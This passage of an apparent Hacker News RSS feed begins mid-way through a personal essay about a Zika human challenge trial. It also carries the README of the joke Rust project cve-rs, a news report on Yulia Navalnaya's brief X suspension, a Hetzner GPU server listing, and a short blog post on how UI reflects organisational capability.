<!-- --><p>The fifth and final approach is vaccination, which works in advance of someone becoming infected in the first place. Inoculation, the practice of exposing people to a disease to develop immunity, dates back to at least Chinese practices in the 1500s. <!-- --><a href="https://medium.com/@antonhowes/11-forgotten-women-who-invented-the-british-industrial-revolution-ea34e185f187">The Ottomans employed it as well</a>. But these old practices generally involved giving people the virus itself, though perhaps a small sample. Vaccinations today typically give people an inert, irradiated, dead, or weakened form of the virus, so that their immune system can handle the intrusion, then recognize it, purge it, and be ready for it, and thus protected, in future.<!-- --></p>



<!-- --><p>Like handwashing or mask-wearing, vaccination aims to prevent an infection before it ever causes a problem. Unlike handwashing or mask-​wearing, you don’t need everyone to keep it up every single day; a single vaccine can protect a patient for years or even a lifetime. Since people are generally keen to get vaccines voluntarily, unlike quarantine measures, nobody’s rights need be violated. Unlike wiping out animal sources of disease, we don’t need to make the difficult ethical or political decision to interfere irreversibly with an ecosystem. Vaccination is the only method by which we have ever driven a disease to eradication: we wiped out <!-- --><a href="https://worksinprogress.co/issue/the-story-of-viktor-zhdanov/">smallpox</a> and rinderpest and we are close to ending polio.<!-- --><sup id="ref-3"></sup> It’s the only path I think is realistic for stopping Zika.<!-- --></p>



<!-- --><p>The first vaccine trial that the Western medical tradition recognizes as such was also a human challenge trial: Edward Jenner deliberately exposed his subject to smallpox. Had he not, he could not have proved that his vaccination prevented smallpox, any more than praying prevented smallpox in the numerous people who happened by chance not to get it. He was following in the tradition of James Lind, who conducted the first controlled trial in 1747. Modern randomized controlled trials (RCTs) are the product of centuries of innovation and improvement: subject blinding was added in the eighteenth century, randomization in the nineteenth, and researcher blinding in the early twentieth.</p>



<!-- --><hr>



<!-- --><p>My trial properly began – after all the paperwork and screening and Covid-19 testing was out of the way – on 2nd October with an injection, not a bite. It was quick and easy, sadly unlike the blood draws that came later. I picked my right arm, and while we would check it every day, it rapidly healed and never caused me any problems.</p>



<!-- --><p>I officially had Zika – or a placebo.</p>



<!-- --><hr>



<!-- --><p>It’s day four.</p>



<!-- --><p>We’re all in the Center for Immunization Research at Johns Hopkins. From the fourth floor of an isolated building, where I now live, I have a lovely view of a helicopter landing pad. Seeing the helicopter take off is sort of like watching a Marvel movie on an airplane: only exciting because of the alternatives.</p>



<!-- --><p>There are four men in this cohort, including me, and, depending on the day, 2–12 members of staff. There used to be an air hockey table for us, but the staff have turned it into some kind of workstation for endless reams of paperwork. I see six staff members on most days. I pass on recommendations from when I filled in government forms of my own and explain why a particular mean needs to be population-weighted for a grad student’s homework. These staff give me book recommendations, compliment the hamburgers I cook, and make surprisingly good criticisms of my Magic: The Gathering games. There’s quite a bit of free time during a human challenge trial. Twenty minutes in the morning for blood and a physical, ten minutes at night for another physical, and then the rest of the day is mine. I can catch up on Netflix, get some work done, or correspond with friends.</p>



<!-- --><p>There are five dorms. The staff claim one of them for when they want to operate in private, and we each get a private five-bed room to ourselves. Spreading my possessions over the four spare beds in my room proves to be roughly as exciting as helicopter watching. The beds are clearly customized for medical needs, with plastic-topped mattresses resilient to whatever residue humans might leave (I avoid thinking too hard about it) and ample storage space underneath. A Dengue study overlaps with ours on the final night, so I will be cruelly deprived of my extra beds. There are lamps and desks, but exercise equipment and the large TVs are all in the shared space.</p>



<!-- --><p>The instructions we were given said to bring underwear, and that scrubs were provided, and so I showed up with nine pairs of socks and underwear. Apparently scrubs were optional, and most of my fellow participants brought normal clothes. Luckily this isn’t high school, so instead of being teased for my fashion faux pas I get to discover that scrubs are remarkably comfortable (and not having to do laundry is very convenient). I still change back into my jeans as soon as I can.</p>



<!-- --><p>I had promised to try to do some work during my stay, but besides that and the half hour of tests, I don’t have to do much of anything. Food is delivered for meals, though we also organize a Costco order for those days when the food order doesn’t quite match our preferences. Sam makes a mean scrambled egg, while I cook burgers for us all one evening.</p>



<!-- --><hr>



<!-- --><p>I should introduce my fellow participants.</p>



<!-- --><p>We’re a small cohort of men (they’d already tested the strains on women). Sam, Max, and Steve (names changed) are all men in their thirties. ​At least two have been to prison; one is unsure whether he would be let into Canada.&nbsp;</p>



<!-- --><p>Sam is a lean veteran of the challenge trial process who always has the nurse draw blood in one exact spot, now blackened by use. He’s a natural leader and ready advocate for us, tying the group together. He wears T-shirts and jeans: he knew enough to pack properly, regardless of what the form said.</p>



<!-- --><p>Max wears a golden necklace and watch, though I don’t have the eye to spot real gold. He has a soft spot for fancy cars: he complains about the repair cost of his Benz and admits he’s previously owned a Saab, a Jaguar, and a BMW. He wants to buy a cargo truck and run his own small fulfillment business (think Amazon deliveries), and thinks that this study will give him the money he needs to get it off the ground. He’s a comical type, a friendly clown with a quick wit and a warm smile, and he flirts gently with one of the staffers.</p>



<!-- --><p>Steve is quiet. He stays up late watching WWE in the evenings. The sound insulation in the building is perfect, and I am thankful.</p>



<!-- --><p>The morning blood draw and physical consists of the nurses taking three to nine vials of blood, examining me for a rash, taking my temperature. The morning blood draw becomes our equivalent of the weather: a petty and varying-enough annoyance to provide opportunities for daily grumbling in the absence of any fresh air. While we are technically allowed to abandon the study any time we want, we otherwise aren’t allowed outside at all for the entire nine days. I rapidly develop a hematoma, a distinctive style of bruise that blood draws can sometimes cause, which sticks around for the rest of the study.</p>



<!-- --><p>It’s hard to draw my blood. I learn that as lovely and charming and personable as staff members Tom and Jane are, they should not be allowed anywhere near my veins. The only person who can reliably get me the first time is an older woman with a war chest of stories and a yellow stress ball. I name the stress ball George.</p>


<!-- --><div>
<!-- --><figure><img src="https://lh7-us.googleusercontent.com/Arj6C7xkDHGiR2f9N3ro0BpVRYQHtwpadwa7nM43GFDEQJbqj1jM_tpZWMW-_MU0Ihm5N5pj6o4gPdqR_GG86VyZX0lO3Di7vQjr69mxEUuuTxgL3l38-gyFnh2Qayi2OcwCwwj3V_IoY-20nYtYNtQ" alt="">
          <!-- --><figcaption>
            <!-- --><div>
              <!-- --><p>
                George Smiley, on day six of nine in-patient days.
              </p>
              <!-- --><div>
                <!-- --><p>Image</p>
                <!-- --><p>
                  Photograph by author.
                </p>
              <!-- --></div>
            <!-- --></div>
          <!-- --></figcaption>
        <!-- --></figure></div>


<!-- --><p>That day, I would joke with the other residents about how none of us were symptomatic in the slightest. The next, the rash would begin in earnest.</p>



<!-- --><p>In disability circles, there’s a useful term: the <!-- --><a href="https://stimpunks.org/glossary/burrito-test/">midnight burrito test</a>. If you can’t go and microwave yourself a frozen burrito at midnight, then no matter what they call it, you’re in an institution. The study passed this test.&nbsp;<!-- --></p>



<!-- --><p>There is a curious lack of autonomy that I experience for the first time in my adult life. Being asked to provide a semen sample is perfectly reasonable, but I’m sympathetic to my compatriots’ complaints that the network bars adult websites. Our meals are selected for us, though there is an occasional effort to get our input, and sometimes we are even able to pick out what we want from Grubhub. There’s a range from <!-- --><a href="https://en.wikipedia.org/wiki/Sweetgreen">Sweetgreen</a> salads to a delicious Maryland crab place.&nbsp;<!-- --></p>



<!-- --><p>I face a decent bit of culture shock. I’m surprised to hear that President Davo has been shot, and having lived in DC for too long I feel a flash of shame that there exists a president whose policies I am not familiar with. Still, I listen in, curious. I should have anticipated that President Davo is, in fact, a rapper. Max likes my ‘fancy-ass’ accent, and I tell him it’s ’cause I am fancy: I did my undergraduate degree at Oxford, with Latin rituals and formal dinners and zero exposure to practicality. They welcome me to the family, easily and without expectation or any calculation of mutual future benefit. It’s a nice break from DC.</p>



<!-- --><p>Initially, I had assumed that I would be in the hospital while sick, and depart it when healthy. Instead they held me long enough to be confident that I would not infect the local mosquitoes, and then sent me home (after my nine days) with instructions to return regularly for more blood draws. I departed with a mild rash on my forehead and upper arms, a headache I rate two out of ten, and minimal other symptoms. It was on the journey home when I was hit by the fatigue, the headache started to be a problem, and the itch became painful and kept escalating. It was nothing too serious, but I admit I would have quite liked to have been in the control group that was injected with saline instead of Zika. I knew that becoming ill was a likely outcome, but that doesn’t make it fun.</p>



<!-- --><p>At the start of this piece, I said I wasn’t fussed with the risk. Looking back at this later, I’m supposed to call this hubris. I still itch across most of my upper body. I’m alternating acetaminophen and ibuprofen. As I edited this piece weeks after the trial, I struggled with fatigue that made it difficult to work. Being released from the hospital only to develop worse symptoms is more than a little strange, but it did mean being taken care of by my partner and eating homemade meals at the worst moments, both of which I enjoyed. All in all, though, I don’t think it was hubris at all. The risks were reasonable, the pay made up for the itch, and I think the benefit to science doubly so.</p>



<!-- --><p>It’s not that Zika is the most important disease in the world. The first death was reported in 2016. As of a <!-- --><a href="https://www.sciencedirect.com/science/article/pii/S1201971219303613">2019 meta-analysis</a> there had been just 51, and with a case fatality rate of under .02 percent, there likely will not be that many more. Malaria, the better known mosquito-borne disease, kills more than half a million people every year.<!-- --></p>



<!-- --><p>But I’m not the most important person in the world, either. Zika is stressful and painful for thousands of people, a headache for policymakers, and a cause of brain malformations in infants. Since it can be sexually transmitted, it can’t be eradicated purely through measures that target mosquitoes. A vaccine for Zika isn’t humanity’s biggest priority, but I’m proud to contribute my small part.</p>



<!-- --><p>One of the issues raised in a bioethics <!-- --><a href="https://www.niaid.nih.gov/sites/default/files/EthicsZikaHumanChallengeStudiesReport2017.pdf">report</a> that delayed my trial is that, unlike firefighters, human challenge trial participants don’t receive social recognition or status for the risks they take on. Apparently, that would help these trials be more ethical.<!-- --></p>



<!-- --><p>Personally, I’m satisfied with the $4,875 and the knowledge that I did something good. Still, it helps that a lack of recognition was not my experience. Due to Covid-19 protocols I was not allowed visitors, but my friends and colleagues were impressed by what I was doing, praised me, and supported me during my recovery. My mother and partner were unhappy with my decision, but without everyone’s support it would have been much more challenging. It was a nice (though strange) week: less stressful (but more boring) than work, better paid than a vacation.</p>



<!-- --><p>There are a handful of weirdos doing human challenge trials because they’re motivated by a love of humanity or science, myself included. But most people do it for the same reason they do any job: for the pay and the working conditions. Challenge studies will hire someone with a criminal record or the intent to spend eight hours a day working remotely on a different job. You can relax and catch up on classic sci-fi movies, play some PS2 games, or talk some strangers into a round of cards. It beats standing up and bagging groceries all day any day.</p>



<!-- --><p>One point I took away is how thankful I am for my independence as a healthy adult who isn’t in prison, boot camp, or school. I can choose my own food, decide on my own medical care within a very broad range ​(including a wide array of legal scams and frauds), and enjoy fresh air. While I certainly prefer it when the organization with control over my life is well-staffed with people who like and respect me (the alternative is <!-- --><a href="https://thingofthings.substack.com/p/on-mental-hospitals">terrible</a>), I’m still happy to be back in my cramped, cheap room with my choice of cheap grocery-store snacks.<!-- --></p>



<!-- --><p>While my autonomy was reduced during the study itself, I’m glad I had the freedom to do it. I believe it is the right of an adult to take a risk for the greater good. I also believe more people going through these studies and sharing these experiences can only help to make trials better aligned with participants’ actual wants and needs. Zika will continue deforming babies and killing vulnerable adults until we end it. I would happily have signed up for another study, on <!-- --><a href="https://www.1daysooner.org/hepatitis-c">hepatitis C</a>, if I qualified. It’s a bittersweet feeling to be ineligible to be given another painful disease, knowing that another will go in my place one way or another – whether it be another willing challenge trial participant or another unwilling victim.<!-- --></p>
<!-- --></div></article><div><div id="reference-item-1"><p>1</p><p><span>Hydrocortisone, Tylenol, ibuprofen, and cetirizine</span></p></div><div id="reference-item-2"><p>2</p><p><span>Not all historical medical practices are endorsed by the author.</span></p></div><div id="reference-item-3"><p>3</p><p><span>Polio still persists in Taliban-controlled regions, after the CIA ran a </span><a href="https://www.scientificamerican.com/article/how-cia-fake-vaccination-campaign-endangers-us-all/"><span>fake vaccination campaign</span></a><span> to try to catch Osama bin Laden. Vaccination workers are now killed as potential spies. It has been eradicated from its other remaining location, </span><a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC7528738/"><span>Nigeria</span></a><span>, and I expect to see it extinct within my lifetime.</span></p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Fast memory vulnerabilities, written in 100% safe Rust (254 pts)]]></title>
            <link>https://github.com/Speykious/cve-rs</link>
            <guid>39440808</guid>
            <pubDate>Tue, 20 Feb 2024 13:17:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://github.com/Speykious/cve-rs">https://github.com/Speykious/cve-rs</a>, See on <a href="https://news.ycombinator.com/item?id=39440808">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-hpc="true"><article itemprop="text"><h2 tabindex="-1" dir="auto">cve-rs</h2>
  <p dir="auto">Blazingly 🔥 fast 🚀 memory vulnerabilities, written in 100% safe Rust. 🦀</p>


<p dir="auto"><strong>cve-rs</strong> allows you to introduce common memory vulnerabilities (such as buffer overflows and segfaults) into your Rust program in a memory safe manner.</p>
<p dir="auto">Rust is an amazing language. You can program a lot of useful things while ensuring that your program will stay safe. Unfortunately, safe Rust is quite limiting. For example, you cannot introduce code that could corrupt the program's memory. Now, with <strong>cve-rs</strong>, you can corrupt your program's memory without corrupting your program's memory.</p>
<p dir="auto">We are very committed to making sure <strong>cve-rs</strong> is memory-safe. We know that unsafe code can have unintended consequences, such as memory unsafety that causes programs to be insecure or unstable. That is why <strong>cve-rs</strong> uses <code>#![deny(unsafe_code)]</code> in the entire codebase. There is not a single block of <code>unsafe</code> code* in this project.</p>
<blockquote>
<p dir="auto"><em>* There is, unfortunately, one exception: In our tests, we compare the results of our safe <code>transmute</code> function against the regular <code>std::mem::transmute</code> function. Perhaps somewhat shortsightedly, the standard library implementation is unsafe. Regardless, this is only in our tests - the core library has no unsafe code.</em></p>
</blockquote>
<p dir="auto"><strong>cve-rs</strong> has safe implementations of the following bugs:</p>
<ul dir="auto">
<li>Use after free</li>
<li>Buffer overflow</li>
<li>Segmentation fault</li>
</ul>
<p dir="auto"><strong>cve-rs</strong> also contains a safe reimplementation of <code>core::mem::transmute</code>.</p>
<p dir="auto">Here is an example of usage with the <code>use-after-free</code> subcommand:</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/Speykious/cve-rs/blob/main/segfault-demo.png"><img src="https://github.com/Speykious/cve-rs/raw/main/segfault-demo.png" alt="segfault demo"></a></p>
<h2 tabindex="-1" dir="auto">Install</h2>
<p dir="auto"><strong>cve-rs</strong> can be used directly with Cargo.</p>
<p dir="auto">To use it as a library:</p>

<p dir="auto">Or to run our example binary:</p>

<h2 tabindex="-1" dir="auto">WASM support</h2>
<p dir="auto"><strong>cve-rs</strong> supports WASM through the WASI API.</p>
<p dir="auto">You can compile it and run it using <a href="https://wasmer.io/" rel="nofollow">Wasmer</a> with the following commands:</p>
<div dir="auto" data-snippet-clipboard-copy-content="cargo build --target wasm32-wasi
wasmer run target/wasm32-wasi/debug/cve-rs.wasm"><pre>cargo build --target wasm32-wasi
wasmer run target/wasm32-wasi/debug/cve-rs.wasm</pre></div>
<h2 tabindex="-1" dir="auto">Contributors</h2>
<p dir="auto">Special thanks to <a href="https://github.com/Bright-Shard">@Bright-Shard</a> and <a href="https://github.com/Creative0708">@Creative0708</a>!</p>
<h2 tabindex="-1" dir="auto">Can I use cve-rs in production?</h2>
<p dir="auto">This project is licensed under the <a href="https://github.com/Speykious/cve-rs/blob/main/LICENSE">GLWTSPL</a>.</p>
<h2 tabindex="-1" dir="auto">License</h2>
<p dir="auto">This project is licensed under the <a href="https://github.com/Speykious/cve-rs/blob/main/LICENSE">GLWTSPL</a>.</p>
<p dir="auto"><a target="_blank" rel="noopener noreferrer" href="https://github.com/me-shaon/GLWTPL/raw/master/good-luck.gif"><img src="https://github.com/me-shaon/GLWTPL/raw/master/good-luck.gif" alt="Good Luck" data-animated-image=""></a></p>
</article></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Yulia Navalnaya’s X account was suspended (110 pts)]]></title>
            <link>https://news.sky.com/story/alexei-navalnys-wife-yulia-navalnaya-has-x-social-media-account-suspended-13076185</link>
            <guid>39440738</guid>
            <pubDate>Tue, 20 Feb 2024 13:07:22 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://news.sky.com/story/alexei-navalnys-wife-yulia-navalnaya-has-x-social-media-account-suspended-13076185">https://news.sky.com/story/alexei-navalnys-wife-yulia-navalnaya-has-x-social-media-account-suspended-13076185</a>, See on <a href="https://news.ycombinator.com/item?id=39440738">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-component-name="sdc-article-body" data-highlight-intro="true">
      
      <p>Alexei Navalny's widow Yulia Navalnaya has had her account suspended on social media platform X.</p><p>It is unclear why her account was suspended by the social network, formerly Twitter - which is owned by <strong><a href="https://news.sky.com/topic/elon-musk-6730" target="_blank">Elon Musk</a></strong>.</p>
<p>"Account suspended," a notice said on the site.</p><p><strong>Russia-Ukraine latest:</strong> <strong><a href="https://news.sky.com/story/russia-ukraine-latest-putin-navalny-avdiivka-latest-sky-news-blog-live-12541713" target="_blank">Moscow puts Navalny's brother on wanted list</a></strong></p><p>Mr Navalny, 47, was a high-profile and vocal critic of Russian President <strong><a href="https://news.sky.com/topic/vladimir-putin-5972" target="_blank">Vladimir Putin</a></strong> and had been serving a 19-year prison term when he <strong><a href="https://news.sky.com/story/russian-opposition-politician-and-putin-critic-alexei-navalny-has-died-13072837" target="_blank">died on Friday in an Arctic penal colony</a></strong>.</p>
<p>His Anti-Corruption Foundation tagged Mr Musk in a post on X, asking him to "please explain exactly which rules were violated" by Ms Navalnaya for the suspension.</p><div aria-label="Consent required" data-component-name="sdc-article-tweet" data-aspect-ratio="" data-consent="pending" data-vendor-name="twitter">
        <p><span>X</span>
            <span data-show-on-fallback="false">
                This content is provided by <span>X</span>, which may be using cookies and other technologies.
                To show you this content, we need your permission to use cookies.
                You can use the buttons below to amend your preferences to enable <span>X</span> cookies or to allow those cookies just once.
                You can change your settings at any time via the <a href="#privacy-options">Privacy Options</a>.
            </span>
            <span data-show-on-fallback="true">
                Unfortunately we have been unable to verify if you have consented to <span>X</span> cookies.
                To view this content you can use the button below to allow <span>X</span> cookies for this session only.
            </span></p>
    </div><p>Less than an hour later, X restored Ms Navalnaya's access to the social media platform.</p><p>X's safety account later said in a post: "Our platform's defence mechanism against manipulation and spam mistakenly flagged @yulia_navalnaya as violating our rules.</p><p>"We unsuspended the account as soon as we became aware of the error, and will be updating the defence."</p>        
<p>Earlier today on her X account, Ms Navalnaya urged the Kremlin to "give back Alexei's body and let him be buried with dignity".</p><p>On Monday she vowed to continue her husband's fight against the Kremlin - and accused Mr Putin of killing the country's opposition leader in a powerful nine-minute video.</p><p>In the video, published on YouTube and shared on X by Mr Navalny's official spokesperson Kira Yarmysh, she also alleged officials' refusal to hand over his body to his mother was part of a cover-up.</p><p>"They are cowardly and meanly hiding his body, refusing to give it to his mother and lying miserably while waiting for the trace of" poison to disappear, Ms Navalnaya said.</p><p>She suggested her husband might have been killed with a novichok-style nerve agent.</p><p>In her video statement, Ms Navalnaya said: "By killing Alexei, Putin killed half of me, half of my heart and half of my soul."</p><p>"But I still have the other half, and it tells me that I have no right to give up.</p><p>"I will continue the work of <strong><a href="https://news.sky.com/topic/alexei-navalny-6698" target="_blank">Alexei Navalny</a></strong>," she said.</p><p>The Kremlin has denied the allegations as "unfounded" and "insolent".</p><p>Mr Putin's spokesman Dmitry Peskov said: "These are absolutely unfounded, insolent accusations about the head of the Russian state."</p> <div>
      <p>
        <h4>Trend in X suspensions raises questions for Musk</h4>
      </p>

      

        <p>X says it suspends accounts that violate its guidelines that broadly aim to protect users' safety and privacy, as well as to restrict use of the platform by bots. This includes, but is not limited to, accounts that promote violence, harass people, post spam or share others' personal details.</p>
        <p>When Yulia Navalnaya's account was temporarily suspended, the platform did not offer an explanation as to which of its guidelines was breached, but suggested that it considered her to have violated its code of conduct in some way.</p>
        <p>The reason for the temporary suspension remains unclear, but it contradicts the image Elon Musk has tried to create for X under his leadership.</p>
        <p>The platform, which was acquired by the Tesla founder in 2022, has moved to reinstate the accounts of a number of users who had been permanently banned, including former US president Donald Trump.</p>
        <p>Musk has previously referred to himself as a "free speech absolutist" and said he wanted X to be a space where a wide range of beliefs could be debated in a healthy manner.</p>
        <p>But Ms Navalnaya's temporary suspension is the latest in a series of suspensions of prominent accounts since the start of the year. In early January, Musk said he would investigate claims X had suspended the accounts of at least eight journalists and others who had criticised the Israeli government.</p>
        <p>"Obviously, it is ok to be critical of anything, but it is not ok to call for extreme violence, as that is illegal," he said in a post on the platform. "(Apart from the 'UN Exemption', where officials from countries recognised by the UN can say what they say at the UN)."</p>
        <p>It remains shrouded in mystery how decisions about suspensions are made, and X under Musk's leadership has been anything but predictable. But the trend in suspensions raises questions about which political views are accepted on the platform and which are not.</p>

  </div>
<p>Mr Navalny's mother, Lyudmila Navalnaya, said in a video on Tuesday taken outside the barbed wire of the prison where her son died: "For the fifth day, I have been unable to see him. They wouldn't release his body to me. And they're not even telling me where he is."</p><p>She added: "I'm reaching out to you, Vladimir Putin.</p><p>"The resolution of this matter depends solely on you. Let me finally see my son.</p><p>"I demand that Alexei's body is released immediately, so that I can bury him like a human being," she said in the footage posted on social media by Mr Navalny's team.</p> <div aria-label="Consent required" data-component-name="sdc-article-custom-markup" data-aspect-ratio="16/9" data-consent="pending" data-vendor-name="spreaker">
        <p><span>Spreaker</span>
            <span data-show-on-fallback="false">
                This content is provided by <span>Spreaker</span>, which may be using cookies and other technologies.
                To show you this content, we need your permission to use cookies.
                You can use the buttons below to amend your preferences to enable <span>Spreaker</span> cookies or to allow those cookies just once.
                You can change your settings at any time via the <a href="#privacy-options">Privacy Options</a>.
            </span>
            <span data-show-on-fallback="true">
                Unfortunately we have been unable to verify if you have consented to <span>Spreaker</span> cookies.
                To view this content you can use the button below to allow <span>Spreaker</span> cookies for this session only.
            </span></p>
    </div><p><a href="https://podfollow.com/skynewsdaily"><strong>Click to subscribe to the Sky News Daily wherever you get your podcasts</strong></a></p><p>Russian authorities have said the cause of Mr Navalny's death is still unknown and refused to release his body for the next two weeks as the preliminary inquest continues and a "chemical analysis" is carried out, his team has said.</p><p><strong>Read more:</strong><br><strong><a href="https://news.sky.com/story/alexei-navalny-russia-denies-claims-that-putin-critic-was-poisoned-with-novichok-13076085" target="_blank">Russia denies claims Navalny was poisoned</a></strong><br><strong><a href="https://news.sky.com/story/donald-trump-breaks-silence-on-alexei-navalnys-death-but-makes-no-mention-of-putin-13075720" target="_blank">Trump breaks silence on Navalny's death</a></strong></p><p>Meanwhile, Mr Navalny's brother has been placed on <strong><a href="https://news.sky.com/topic/russia-5803" target="_blank">Russia</a></strong>'s wanted list, according to state media.</p><p>A new criminal case has been opened against Oleg Navalny, making him a wanted man in Russia.</p> <div>
  <figure>
    <p><img loading="lazy" intrinsicsize="768x432" src="https://e3.365dm.com/24/02/768x432/skynews-alexei-navalny-russia_6462336.jpg?20240220140626" srcset="https://e3.365dm.com/24/02/384x216/skynews-alexei-navalny-russia_6462336.jpg?20240220140626 380w, https://e3.365dm.com/24/02/768x432/skynews-alexei-navalny-russia_6462336.jpg?20240220140626 760w, https://e3.365dm.com/24/02/1600x900/skynews-alexei-navalny-russia_6462336.jpg?20240220140626 1024w, https://e3.365dm.com/24/02/2048x1152/skynews-alexei-navalny-russia_6462336.jpg?20240220140626 2048w" sizes="(min-width: 1024px) 1024px, 100vw" alt="Alexei Navalny (L) and his brother Oleg Navalny at a court hearing in Moscow, Russia, in 2014. Pic: Reuters">
    </p>
      <figcaption>
        <span>Image:</span>
        <span>Alexei Navalny (L) and his brother Oleg Navalny at a court hearing in Moscow, Russia, in 2014. Pic: Reuters
        </span>
      </figcaption>
  </figure>
</div>
<p>In 2021, he was handed a one-year suspended sentence for breaking COVID restrictions after he was accused of calling for Russians to attend a rally for his brother.</p><p>He was sentenced in absentia in February 2022 to one year in prison for violating the terms of the suspended sentence.</p>     <a href="https://news.sky.com/download-app" target="blank" data-tracking-label="ui-app-promo-download-link" data-type="" data-component-name="ui-app-promo">
        
    </a>


<p>His whereabouts are unknown. He travelled to Cyprus in 2021 and did not return to Russia, according to court documents cited by news agencies.</p>
    </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Hetzner GPU Server (222 pts)]]></title>
            <link>https://robot.hetzner.com/order/index/culture/en_GB</link>
            <guid>39440503</guid>
            <pubDate>Tue, 20 Feb 2024 12:39:16 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://robot.hetzner.com/order/index/culture/en_GB">https://robot.hetzner.com/order/index/culture/en_GB</a>, See on <a href="https://news.ycombinator.com/item?id=39440503">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
                  <!--Start of content -->
                    <p><span>
    <strong>Language: </strong>
          </span>
  <span>
    <strong>Country: </strong>
    
      <a href="#" onclick="javascript: jQuery('.country_select_background').fadeIn()">
        <img src="https://robot.hetzner.com/images/countries/de.png"> Germany
      </a>
        
    
    </span></p><hr>


<p><img src="https://robot.hetzner.com/images/gex44-robot_en.jpg"></p><p>Thank you for your interest in the products of Hetzner Online.</p>

  <p>
    If you are not a Hetzner client yet and want to take over a server or Storage Box from another Hetzner client, please use the <a href="https://robot.hetzner.com/server/transferCreate">server transfer site</a> or the <a href="https://robot.hetzner.com/storage/transferCreate">Storage Box transfer site</a>.  </p>

<p>
  To view the current order status have a look at our <a onclick="var w=window.open(this.href);w.focus();return false;" href="https://docs.hetzner.com/general/others/order-processing">Order processing status site</a>.</p>


<div id="0"><h2>Shopping cart</h2></div>
<p><strong>We offer the following products:</strong></p>



  
  
  



  <div>
      
          
          
          
              
                          
        <div id="1395"><div><ul><li>AMD Ryzen 9 7950X3D 16-Core "Raphael" (Zen 4)</li><li>128 GB DDR5 ECC RAM</li><li>2 x 1.92 TB NVMe SSD Datacenter Edition (Gen 4, Software RAID 1)</li><li>1 Gbit/s bandwidth</li></ul><p><a href="https://www.hetzner.com/dedicated-rootserver/ax102?country=DE">more information...</a></p></div><hr><p><strong>Price (monthly): from <span>€ 123.76</span></strong><br><strong>Setup (once): € 46.41</strong></p><hr></div>          
          
          
          
          
          
          
          
          
          
          
              
                          
        <div id="1394"><div><ul><li>Intel® Core™ i9-13900 24 Core "Raptor Lake-S"</li><li>64 GB DDR5 ECC RAM</li><li>2 x 1.92 TB NVMe SSD Datacenter Edition (Gen4, Software RAID 1)</li><li>1 Gbit/s bandwidth</li></ul><p><a href="https://www.hetzner.com/dedicated-rootserver/ex101?country=DE">more information...</a></p></div><hr><p><strong>Price (monthly): from <span>€ 99.96</span></strong><br><strong>Setup (once): € 46.41</strong></p><hr></div>          
              
                          
        <div id="1608"><p>Dedicated GPU-Server GEX44</p><div id="content_1608"><div><ul><li>Intel® Core™ i5-13500 14 Core "Raptor Lake-S"</li><li>64 GB DDR4 RAM</li><li>2 x 1.92 TB NVMe SSD Datacenter Edition (Gen 3, Software RAID 1)</li><li>Nvidia RTX 4000 SFF Ada Generation</li><li>1 Gbit/s bandwidth</li></ul></div><hr><p><strong>Price (monthly): <span>€ 218.96</span></strong><br><strong>Setup (once): € 94.01</strong></p><hr></div></div>                
          
          
                
          
          
          
                
                
              </div>
  
  <br>


  
  
        
  
  
  
        
  
  
  
        
  
  
  
        
  
                        <!--End of content -->
                </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[UI Is a Function of Your Organization (141 pts)]]></title>
            <link>https://blog.jim-nielsen.com/2024/ui-fn-org/</link>
            <guid>39440480</guid>
            <pubDate>Tue, 20 Feb 2024 12:35:52 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.jim-nielsen.com/2024/ui-fn-org/">https://blog.jim-nielsen.com/2024/ui-fn-org/</a>, See on <a href="https://news.ycombinator.com/item?id=39440480">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
          
          <p>The Domino’s “Pizza Tracker” is an intriguing piece of UI.</p>
<p>As an end user, it provides the precision of detail you want in tracking your order:</p>
<ul>
<li>Your order has been received</li>
<li>Your pizza is being prepped</li>
<li>Your pizza is in the oven</li>
<li>Your pizza is being checked for quality by {EMPLOYEE_NAME}</li>
<li>Your pizza is being delivered by {EMPLOYEE_NAME}</li>
</ul>
<p>But think of everything it takes to make that UI possible, where every digital order routes to a local store and every local store has the hardware and software to live track and update the position of your pizza.</p>
<p>I’ve worked on a project like this, a “track my claim” in the insurance world. As a designer, it’s nice to sit at a desk and design an ideal scenario:</p>
<ul>
<li>Something happened to your house</li>
<li>You file a claim</li>
<li>Your claim is reviewed</li>
<li>An adjuster visits your house</li>
<li>$$$ is wired to your account</li>
</ul>
<p>But when the rubber of your UI hits the road of reality within an organization, people and processes often cannot bend and stretch to the automated expectations of a idealized process.</p>
<p>What do you end up with in that scenario? A thousand tiny compromises. </p>
<p>For example (going back to pizza), you find out that not every store can track precisely when an order is received and when it goes into the oven, so the UI becomes a facade — dare I say a lie — where the step from “order received” to “pizza in the oven” happens only because of a timer in the UI (and a corporate policy of, “all orders must be in the oven within five minutes of being received”). It’s not a representation of reality, but a facade of it.</p>
<p><a href="https://blog.jim-nielsen.com/2023/faux-progress/">These kinds of facades happen all the time in software</a>. “We think this will complete, at the most, within ___ time.” So we make progress indicators that look like they’re a live, up-to-date representation of progress that poll some kind of technological feedback mechanism for live status updates. But in reality they’re merely clocks counting down from a set time of “this is the most time we think it should take”.</p>
<p>This is why designing UI is designing an organization.</p>
<p>You can only design and make real a UI that matches an organization’s capabilities to deliver on its promise.</p>
<p>This is why startups are best suited to these kinds of radical UIs tailored to reality. Their entire organizational structure, which is small, can orient around a single idea and deliver on it — then build to scale.</p>
<p>Your UIs, and the real life experiences they deliver, can only ever be as good as an organization’s capabilities to deliver on them.</p>
<p>This is what I mean by UI=f(org): UI is a function of your organization.</p>

        </div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Rotten Apple (195 pts)]]></title>
            <link>https://adactio.com/journal/20888</link>
            <guid>39440423</guid>
            <pubDate>Tue, 20 Feb 2024 12:27:15 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://adactio.com/journal/20888">https://adactio.com/journal/20888</a>, See on <a href="https://news.ycombinator.com/item?id=39440423">Hacker News</a></p>
